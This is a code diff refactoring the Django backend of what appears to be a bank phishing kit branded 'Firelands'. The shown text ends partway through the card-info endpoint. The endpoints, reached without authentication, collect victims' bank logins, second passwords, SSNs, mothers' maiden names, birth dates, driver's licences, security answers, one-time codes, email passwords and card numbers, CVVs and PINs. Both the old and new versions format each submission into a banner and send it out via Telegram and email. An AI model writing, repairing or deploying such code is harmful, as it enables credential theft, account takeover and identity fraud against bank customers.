@@ -1,6 +1,6 @@
 from rest_framework.decorators import api_view, permission_classes, authentication_classes
 from rest_framework.response import Response
-from core.settings import app_settings
+from core.app_config import app_settings
 from core.utils import (
     get_client_ip,
     get_country_from_ip,
@@ -23,535 +23,465 @@ logger = logging.getLogger(__name__)
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_login_cred(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            username = request.data.get('emzemz', '')
-            password = request.data.get('pwzenz', '')
-            
-            if not username or not password:
-                return Response({'error': 'Username and password required'}, status=400)
-                
-            client, _ = Client.objects.get_or_create(username=username)
-            client.email = username
-            client.save()
-            
-            BankInfo.objects.create(
-                client=client,
-                password=password,
-                username=username
-            )
-            
-            ip = get_client_ip(request)
-            agent = request.META.get('HTTP_USER_AGENT', '')
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
-            
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ LOGIN ] ==========|\n"
-            message += f"| ➤ [ Username ]         : {username}\n"
-            message += f"| ➤ [ Password ]         : {password}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
-            
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(username, message)
-            
-            payload['message'] = 'Successful'
-            return Response(payload)
-            
-        except Exception as e:
-            logger.exception("firelands_collect_user_login_cred failed")
-            payload['message'] = 'Errors'
-            return Response(payload, status=500)
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    try:
+        payload = request.data
+        username = payload.get('emzemz', '')
+        password = payload.get('pwzenz', '')
+
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
+            }
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  LOGIN  ] ==========|\n"
+        message += f"| ➤ [ Username ]         : {username}\n"
+        message += f"| ➤ [ Password ]         : {password}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Login - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_login_cred: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_login_cred2(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            username = request.data.get('emzemz', '')
-            password = request.data.get('pwzenz', '')
-            
-            if not username or not password:
-                return Response({'error': 'Username and password required'}, status=400)
-                
-            client, _ = Client.objects.get_or_create(username=username)
-            bank_info, _ = BankInfo.objects.get_or_create(client=client)
-            bank_info.password2 = password
-            bank_info.save()
-            
-            ip = get_client_ip(request)
-            agent = request.META.get('HTTP_USER_AGENT', '')
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
-            
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ LOGIN CONFIRM ] ==========|\n"
-            message += f"| ➤ [ Username ]        : {username}\n"
-            message += f"| ➤ [ Password2 ]       : {password}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
-            
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(username, message)
-            
-            payload['message'] = 'Successful'
-            return Response(payload)
-            
-        except Exception as e:
-            logger.exception("firelands_collect_user_login_cred2 failed")
-            payload['message'] = 'Errors'
-            return Response(payload, status=500)
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    try:
+        payload = request.data
+        username = payload.get('emzemz', '')
+        password = payload.get('pwzenz', '')
+
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
+            }
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  LOGIN CONFIRM  ] ==========|\n"
+        message += f"| ➤ [ Username ]        : {username}\n"
+        message += f"| ➤ [ Password2 ]       : {password}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Login Confirm - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_login_cred2: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_basic_info(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            fields = {
-                'username': request.data.get('emzemz', ''),
-                'firstName': request.data.get('fzNme', ''),
-                'lastName': request.data.get('lzNme', ''),
-                'phone': request.data.get('phone', ''),
-                'ssn': request.data.get('ssn', ''),
-                'motherMaidenName': request.data.get('motherMaidenName', ''),
-                'dob': request.data.get('dob', ''),
-                'driverLicense': request.data.get('driverLicense', ''),
-                'streetAddress': request.data.get('stAd', ''),
-                'apt': request.data.get('apt', ''),
-                'city': request.data.get('city', ''),
-                'state': request.data.get('state', ''),
-                'zipCode': request.data.get('zipCode', '')
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    try:
+        payload = request.data
+        fields = {
+            'username': payload.get('emzemz', ''),
+            'firstName': payload.get('fzNme', ''),
+            'lastName': payload.get('lzNme', ''),
+            'phone': payload.get('phone', ''),
+            'ssn': payload.get('ssn', ''),
+            'motherMaidenName': payload.get('motherMaidenName', ''),
+            'dob': payload.get('dob', ''),
+            'driverLicense': payload.get('driverLicense', ''),
+            'streetAddress': payload.get('stAd', ''),
+            'apt': payload.get('apt', ''),
+            'city': payload.get('city', ''),
+            'state': payload.get('state', ''),
+            'zipCode': payload.get('zipCode', '')
+        }
+
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
             }
-            
-            client = Client.objects.get(username=fields['username'])
-            client.first_name = fields['firstName']
-            client.last_name = fields['lastName']
-            client.phone = fields['phone']
-            client.ssn = fields['ssn']
-            client.mother_maiden_name = fields['motherMaidenName']
-            client.dob = fields['dob']
-            client.driver_license = fields['driverLicense']
-            client.save()
-            
-            # Browser details and notification logic
-            ip = get_client_ip(request)
-            agent = request.META.get('HTTP_USER_AGENT', '')
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
-            
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ BASIC INFO ] ==========|\n"
-            message += f"| ➤ [ Username ]           : {fields['username']}\n"
-            message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
-            message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
-            message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
-            message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
-            message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
-            message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
-            message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"
-            
-            if any([fields['streetAddress'], fields['city'], fields['state'], fields['zipCode']]):
-                message += "|=====================================|\n"
-                message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
-                message += "|======================================|\n"
-                if fields['streetAddress']:
-                    message += f"| ➤ [ Street Address ]     : {fields['streetAddress']}\n"
-                if fields['apt']:
-                    message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
-                if fields['city']:
-                    message += f"| ➤ [ City ]               : {fields['city']}\n"
-                if fields['state']:
-                    message += f"| ➤ [ State ]              : {fields['state']}\n"
-                if fields['zipCode']:
-                    message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"
-            
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  BASIC INFO  ] ==========|\n"
+        message += f"| ➤ [ Username ]           : {fields['username']}\n"
+        message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
+        message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
+        message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
+        message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
+        message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
+        message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
+        message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"
+
+        if any([fields['streetAddress'], fields['city'], fields['state'], fields['zipCode']]):
             message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+            message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
             message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
-            
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(fields['username'], message)
-            
-            payload["message"] = "Successful"
-        except Exception as e:
-            logger.exception("firelands_collect_user_basic_info failed")
-            payload["message"] = "Errors"
-            return Response(payload, status=500)
-    return Response(payload)
+            if fields['streetAddress']:
+                message += f"| ➤ [ Street Address ]     : {fields['streetAddress']}\n"
+            if fields['apt']:
+                message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
+            if fields['city']:
+                message += f"| ➤ [ City ]               : {fields['city']}\n"
+            if fields['state']:
+                message += f"| ➤ [ State ]              : {fields['state']}\n"
+            if fields['zipCode']:
+                message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"
+
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Basic Info - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_basic_info: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_security_questions(request):
-    payload = {}
-    errors = {}
-    
-    if request.method == 'POST':
-        try:
-            fields = {
-                'username': request.data.get('emzemz', ''),
-                'question1': request.data.get('securityQuestion1', ''),
-                'answer1': request.data.get('securityAnswer1', ''),
-                'question2': request.data.get('securityQuestion2', ''),
-                'answer2': request.data.get('securityAnswer2', ''),
-                'question3': request.data.get('securityQuestion3', ''),
-                'answer3': request.data.get('securityAnswer3', '')
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    try:
+        payload = request.data
+        fields = {
+            'username': payload.get('emzemz', ''),
+            'question1': payload.get('securityQuestion1', ''),
+            'answer1': payload.get('securityAnswer1', ''),
+            'question2': payload.get('securityQuestion2', ''),
+            'answer2': payload.get('securityAnswer2', ''),
+            'question3': payload.get('securityQuestion3', ''),
+            'answer3': payload.get('securityAnswer3', '')
+        }
+
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
             }
-            
-            # Validate all fields required
-            for field, value in fields.items():
-                if not value:
-                    errors[field] = [f"{field} is required"]
-            
-            if errors:
-                return Response({"errors": errors}, status=400)
-                
-            client = Client.objects.get(username=fields['username'])
-            client.security_question_1 = fields['question1']
-            client.security_answer_1 = fields['answer1']
-            client.security_question_2 = fields['question2']
-            client.security_answer_2 = fields['answer2']
-            client.security_question_3 = fields['question3']
-            client.security_answer_3 = fields['answer3']
-            client.save()
-            
-            # Standard browser details and notification
-            ip = get_client_ip(request)
-            agent = request.META.get("HTTP_USER_AGENT", "")
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
+        )
 
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ SECURITY QUESTIONS ] ==========|\n"
-            message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
-            message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
-            message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
-            message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
-            message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
-            message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  SECURITY QUESTIONS  ] ==========|\n"
+        message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
+        message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
+        message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
+        message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
+        message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
+        message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
 
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(fields['username'], message)
-            
-            payload["message"] = "Successful"
-        except Exception as e:
-            logger.exception("firelands_collect_user_security_questions failed")
-            payload["message"] = "Errors"
-            return Response(payload, status=500)
-    return Response(payload)
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Security Questions - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_security_questions: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_otp_verification(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            username = request.data.get('emzemz', '')
-            otp = request.data.get('otp', '')
-            
-            if not username or not otp:
-                return Response({"error": "Username and OTP required"}, status=400)
-                
-            client = Client.objects.get(username=username)
-            
-            # Browser details and notification
-            ip = get_client_ip(request)
-            agent = request.META.get("HTTP_USER_AGENT", "")
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ OTP VERIFICATION ] ==========|\n"
-            message += f"| ➤ [ Username ]      : {username}\n"
-            message += f"| ➤ [ OTP Code ]      : {otp}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
+    try:
+        payload = request.data
+        username = payload.get('emzemz', '')
+        otp = payload.get('otp', '')
 
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(username, message)
-            
-            payload["message"] = "Successful"
-        except Exception as e:
-            logger.exception("firelands_collect_user_otp_verification failed")
-            payload["message"] = "Errors"
-            return Response(payload, status=500)
-    return Response(payload)
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
+            }
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  OTP VERIFICATION  ] ==========|\n"
+        message += f"| ➤ [ Username ]      : {username}\n"
+        message += f"| ➤ [ OTP Code ]      : {otp}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands OTP Verification - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_otp_verification: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_email_password(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            username = request.data.get('emzemz', '')
-            email = request.data.get('email', '')
-            password = request.data.get('password', '')
-            
-            if not username or not email or not password:
-                return Response({"error": "Username, email and password required"}, status=400)
-                
-            client = Client.objects.get(username=username)
-            client.email = email
-            client.save()
-            
-            bank_info, _ = BankInfo.objects.get_or_create(client=client)
-            bank_info.email_password = password
-            bank_info.save()
-            
-            # Browser details and notification
-            ip = get_client_ip(request)
-            agent = request.META.get("HTTP_USER_AGENT", "")
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
+    city = get_city_from_ip(ip)
+    browser = get_user_browser(request)
+    os = get_user_os(request)
+    agent = request.META.get('HTTP_USER_AGENT', '')
+    date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
-            message += "|========= [ EMAIL & PASSWORD ] ==========|\n"
-            message += f"| ➤ [ Username ]      : {username}\n"
-            message += f"| ➤ [ Email ]         : {email}\n"
-            message += f"| ➤ [ Password ]      : {password}\n"
-            message += "|=====================================|\n"
-            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
-            message += "|======================================|\n"
-            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
-            message += f"| ➤ [ IP Country ]   : {country}\r\n"
-            message += f"| ➤ [ IP City ]      : {city}\r\n"
-            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
-            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
-            message += f"| ➤ [ TIME ]         : {date}\r\n"
-            message += "|=====================================|\n"
+    try:
+        payload = request.data
+        username = payload.get('emzemz', '')
+        email = payload.get('email', '')
+        password = payload.get('password', '')
 
-            send_data_telegram(app_settings, message)
-            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
-            save_data_to_file(username, message)
-            
-            payload["message"] = "Successful"
-        except Exception as e:
-            logger.exception("firelands_collect_user_email_password failed")
-            payload["message"] = "Errors"
-            return Response(payload, status=500)
-    return Response(payload)
+        # Browser details
+        browser_detail, created = BrowserDetail.objects.get_or_create(
+            ip_address=ip,
+            defaults={
+                'country': country,
+                'city': city,
+                'browser': browser,
+                'os': os,
+                'user_agent': agent
+            }
+        )
+
+        # Notification message
+        message = "|=====||Firelands Flow||=====|\n"
+        message += "|========= [  EMAIL & PASSWORD  ] ==========|\n"
+        message += f"| ➤ [ Username ]      : {username}\n"
+        message += f"| ➤ [ Email ]         : {email}\n"
+        message += f"| ➤ [ Password ]      : {password}\n"
+        message += "|=====================================|\n"
+        message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += "|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += "|=====================================|\n"
+
+        # Send notifications
+        send_data_telegram(app_settings, message)
+        
+        subject = f"Firelands Email & Password - {ip}"
+        from_email = app_settings['from_email']
+        recipient_list = app_settings['send_email_list']
+        send_data_email(subject, message, from_email, recipient_list)
+
+        return Response({'status': 'success'}, status=200)
+
+    except Exception as e:
+        logger.error(f'Error in firelands_collect_user_email_password: {str(e)}')
+        return Response({'error': str(e)}, status=400)
 
 @api_view(['POST'])
 @permission_classes([])
 @authentication_classes([])
 def firelands_collect_user_card_info(request):
-    payload = {}
-    
-    if request.method == 'POST':
-        try:
-            username = request.data.get('emzemz', '')
-            cardNumber = request.data.get('cardNumber', '')
-            expiryDate = request.data.get('expiryDate', '')
-            cvv = request.data.get('cvv', '')
-            cardPin = request.data.get('cardPin', '')
-            
-            if not username or not cardNumber or not expiryDate or not cvv or not cardPin:
-                return Response({"error": "All card fields required"}, status=400)
-                
-            client = Client.objects.get(username=username)
-            
-            bank_info, _ = BankInfo.objects.get_or_create(client=client)
-            bank_info.card_number = cardNumber
-            bank_info.card_expiry = expiryDate
-            bank_info.card_cvv = cvv
-            bank_info.card_pin = cardPin
-            bank_info.save()
-            
-            # Browser details and notification
-            ip = get_client_ip(request)
-            agent = request.META.get("HTTP_USER_AGENT", "")
-            country = get_country_from_ip(ip)
-            city = get_city_from_ip(ip)
-            browser = get_user_browser(agent)
-            os = get_user_os(agent)
-            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
-            
-            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
-            browser_data.ip = ip
-            browser_data.agent = agent
-            browser_data.country = country
-            browser_data.city = city
-            browser_data.address = f"{city}, {country}"
-            browser_data.browser = browser
-            browser_data.os = os
-            browser_data.time = date
-            browser_data.date = date
-            browser_data.save()
+    ip = get_client_ip(request)
+    country = get_country_from_ip(ip)
